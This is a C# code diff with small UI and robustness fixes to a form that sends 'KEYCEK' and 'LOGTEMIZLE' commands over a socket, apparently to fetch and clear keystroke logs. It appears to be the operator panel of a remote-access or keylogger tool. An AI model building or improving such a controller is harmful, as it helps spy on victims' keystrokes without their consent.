@@ -19,6 +19,7 @@ namespace SV
             button3.Click += button3_Click;
             button4.Click += button4_Click;
             metroTabControl1.SelectedIndex = 0;
+            textBox1.TextChanged += textBox1_TextChanged;
         }
 
         private void button1_Click(object sender, EventArgs e)
@@ -45,14 +46,17 @@ namespace SV
 
         private void button3_Click(object sender, EventArgs e)
         {
-            if (!string.IsNullOrEmpty(comboBox1.SelectedItem.ToString()) && comboBox1.SelectedItem.ToString() != "No logs.")
+            if (comboBox1.SelectedIndex > -1)
             {
-                try
+                if (!string.IsNullOrEmpty(comboBox1.SelectedItem.ToString()) && comboBox1.SelectedItem.ToString() != "No logs.")
                 {
-                    byte[] senddata = Form1.MyDataPacker("KEYCEK", Encoding.UTF8.GetBytes(comboBox1.SelectedItem.ToString()));
-                    sock.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
+                    try
+                    {
+                        byte[] senddata = Form1.MyDataPacker("KEYCEK", Encoding.UTF8.GetBytes(comboBox1.SelectedItem.ToString()));
+                        sock.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
+                    }
+                    catch (Exception) { }
                 }
-                catch (Exception) { }
             }
         }
 
@@ -61,8 +65,10 @@ namespace SV
             try
             {
                 byte[] senddata = Form1.MyDataPacker("LOGTEMIZLE", Encoding.UTF8.GetBytes("ECHO"));
-                sock.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
+                sock.Send(senddata, 0, senddata.Length, SocketFlags.None);
                 comboBox1.Items.Clear();
+                comboBox1.Style = MetroFramework.MetroColorStyle.Silver;
+                comboBox1.Theme = MetroFramework.MetroThemeStyle.Dark;
             }
             catch (Exception) { }
         }
@@ -75,6 +81,7 @@ namespace SV
         private void textBox1_TextChanged(object sender, EventArgs e)
         {
             textBox1.SelectionStart = textBox1.Text.Length;
+            textBox1.ScrollToCaret();
         }
     }
 }
